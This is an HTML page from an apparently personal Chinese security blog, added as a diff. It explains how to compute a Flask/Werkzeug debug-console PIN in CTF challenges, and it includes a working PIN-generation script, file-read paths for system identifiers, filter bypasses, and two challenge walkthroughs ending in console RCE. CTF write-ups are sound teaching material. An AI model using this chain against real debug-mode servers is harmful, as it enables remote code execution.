@@ -1,0 +1,314 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>关于ctf中flask算pin总结 | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>关于ctf中flask算pin总结</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/2/20
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/python/" style="color: #ff7d73">python</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/flask/" style="color: #ff7d73">flask</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%90%8E%E7%AB%AF/" style="color: #00a596">后端</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="什么是pin码"><a href="#什么是pin码" class="headerlink" title="什么是pin码"></a>什么是pin码</h1><p>pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell</p>
+<h1 id="pin码如何生成"><a href="#pin码如何生成" class="headerlink" title="pin码如何生成"></a>pin码如何生成</h1><p>pin码生成要六要素<br>1.username 在可以任意文件读的条件下读 &#x2F;etc&#x2F;passwd进行猜测<br>2.modname 默认<code>flask.app</code><br>3.appname 默认<code>Flask</code><br>4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量<br>5.uuidnode mac地址的十进制,任意文件读 <code>/sys/class/net/eth0/address</code><br>6.machine_id 机器码 这个待会细说,一般就生成pin码不对就是这错了</p>
+<p>在python3.8以后生成的脚本如下</p>
+<pre><code class="python">import hashlib
+from itertools import chain
+probably_public_bits = [
+    &#39;app&#39;,
+    &#39;flask.app&#39;,
+    &#39;Flask&#39;,
+    &#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39; 
+]
+
+private_bits = [
+    &#39;2485376911915&#39;,
+    &#39;7265fe765262551a676151a24c02b7b646a18828428b87e35c5482255b121e8f7464b02e50ffe3f1d626f8c05793f49a&#39;# get_machine_id(), /etc/machine-id  /proc/sys/kernel/random/boot_id
+]   
+
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode(&quot;utf-8&quot;)
+    h.update(bit)
+h.update(b&quot;cookiesalt&quot;)
+
+cookie_name = f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;
+
+# If we need to generate a pin we salt it a bit more so that we don&#39;t
+# end up with the same value and generate out 9 digits
+num = None
+if num is None:
+    h.update(b&quot;pinsalt&quot;)
+    num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]
+
+# Format the pincode in groups of digits for easier remembering if
+# we don&#39;t have a result yet.
+rv = None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = &quot;-&quot;.join(
+                num[x : x + group_size].rjust(group_size, &quot;0&quot;)
+                for x in range(0, len(num), group_size)
+            )
+            break
+    else:
+        rv = num
+
+print(rv)
+</code></pre>
+<h1 id="关于machine-id"><a href="#关于machine-id" class="headerlink" title="关于machine-id"></a>关于machine-id</h1><p>如果能任意文件读尝试去读取<code>/usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py</code><br>上面的python版本可以通过报错拿到<br>去找里面的get_machine-id方法<br><img src="https://img-blog.csdnimg.cn/623b41985de64bc3aa0fd8de989bfd9c.png" alt="在这里插入图片描述"><br>可以知道<code>/etc/machine-id</code>和<code>/proc/sys/kernel/random/boot_id</code>只要读取到其中一个就break的<br>然后继续拼接上<code>/proc/self/cgroup</code>下的用正则匹配到的值<br>其实肉眼也能看出来<br>那么很明了了<br>machine-id是又两个值拼接的<br>下面直接上例题</p>
+<h1 id="CTFSHOW801"><a href="#CTFSHOW801" class="headerlink" title="CTFSHOW801"></a>CTFSHOW801</h1><p><img src="https://img-blog.csdnimg.cn/7db57bdc7ee84df998da584d6f6abfd2.png" alt="在这里插入图片描述"></p>
+<pre><code class="python">probably_public_bits = [
+    &#39;root&#39;,#读/etc/passwd
+    &#39;flask.app&#39;,#默认
+    &#39;Flask&#39;,#默认
+    &#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39; #报错得到
+]
+</code></pre>
+<p>然后读网卡<br><img src="https://img-blog.csdnimg.cn/ad83121fe4774df981427a8aeef8492e.png" alt="在这里插入图片描述"><br>转十进制<br><img src="https://img-blog.csdnimg.cn/0fd023d47e8d46b39a3afdc3e5b8c29e.png" alt="在这里插入图片描述"><br>machine-id<br><code>/etc/machine-id</code>读不到,那么就是<code>/proc/sys/kernel/random/boot_id</code>和<code>/proc/self/cgroup</code>拼接了<br>得到machine-id<br>此处cgroup下读的是docker&#x2F;后面的那串字符串<br><img src="https://img-blog.csdnimg.cn/510e1444667b4f409c1c7db287215de3.png" alt="在这里插入图片描述"><br>计算pin码得到548-952-682<br>然后报错或访问&#x2F;consloe进控制台rce<br><img src="https://img-blog.csdnimg.cn/c0331f0f98fe4b9b8f0fca34b62a3649.png" alt="在这里插入图片描述"></p>
+<h1 id="过滤相关"><a href="#过滤相关" class="headerlink" title="过滤相关"></a>过滤相关</h1><p>本题中没有过滤,那么当过滤了<code>self</code>的时候怎么办呢<br>也就是<code>/proc/self/cgroup</code>没法用了<br>其中的<code>self</code>可以用相关进程的pid去替换,其实<code>1</code>就行<br><img src="https://img-blog.csdnimg.cn/964ea3ea44454fb6910c93aee791e2b4.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/cea67fade92b4077bf234cf5bd1343b7.png" alt="在这里插入图片描述"><br>那么<code>cgroup</code>过滤了呢?<br>可以考虑<code>mountinfo</code>或者<code>cpuset</code><br><img src="https://img-blog.csdnimg.cn/c2d03b3331aa496797b1392b1e957842.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bbd86e42e2d74a4fba69561aaa66e579.png" alt="在这里插入图片描述"></p>
+<p>接下里再看几题吧</p>
+<h1 id="HSCSEC-2TH-EZFLASK"><a href="#HSCSEC-2TH-EZFLASK" class="headerlink" title="HSCSEC-2TH EZFLASK"></a>HSCSEC-2TH EZFLASK</h1><p>拿用户<br><img src="https://img-blog.csdnimg.cn/dd68d2ad56884c8d85b60fff8b40450a.png" alt="在这里插入图片描述"></p>
+<p>拿版本<br><img src="https://img-blog.csdnimg.cn/7e0225575b9041adb809607c779cdb1e.png" alt="在这里插入图片描述"><br>本题能读到<code>/etc/machine-id</code><br>拼接得到<br><img src="https://img-blog.csdnimg.cn/0e69232f67334d168d3507daf05938e5.png" alt="在这里插入图片描述"></p>
+<p>生成pin码进console</p>
+<p><img src="https://img-blog.csdnimg.cn/8bf2123b0a16443da7fa2a8f00683e1e.png" alt="在这里插入图片描述"><br>读不了flag,用环境下的readflag读</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
